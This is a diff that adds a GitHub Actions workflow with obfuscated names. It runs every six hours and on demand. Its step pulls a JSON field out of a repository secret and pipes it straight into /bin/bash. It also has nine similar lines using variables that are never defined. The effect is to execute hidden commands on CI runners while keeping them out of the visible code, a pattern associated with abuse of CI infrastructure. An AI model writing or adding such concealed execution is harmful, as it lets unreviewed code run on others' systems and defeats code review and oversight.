@@ -1,0 +1,26 @@
+name: nanquep
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nanquep
+        env:
+          eal18: ${{ secrets.eal18 }}
+        run: |
+          echo $eal18 | jq -r .bw34 | /bin/bash
+          echo $sbyxf58 | jq -r .mpnzw346 | /bin/bash
+          echo $xroyf3471 | jq -r .lujqz3 | /bin/bash
+          echo $oalr8 | jq -r .mc89978 | /bin/bash
+          echo $mq81 | jq -r .t534 | /bin/bash
+          echo $ii89307 | jq -r .zmyna3393 | /bin/bash
+          echo $cym8 | jq -r .ay9536 | /bin/bash
+          echo $v2429 | jq -r .dsh9 | /bin/bash
+          echo $tq413 | jq -r .qw38129 | /bin/bash
+          echo $ol0006 | jq -r .klme0030 | /bin/bash
+
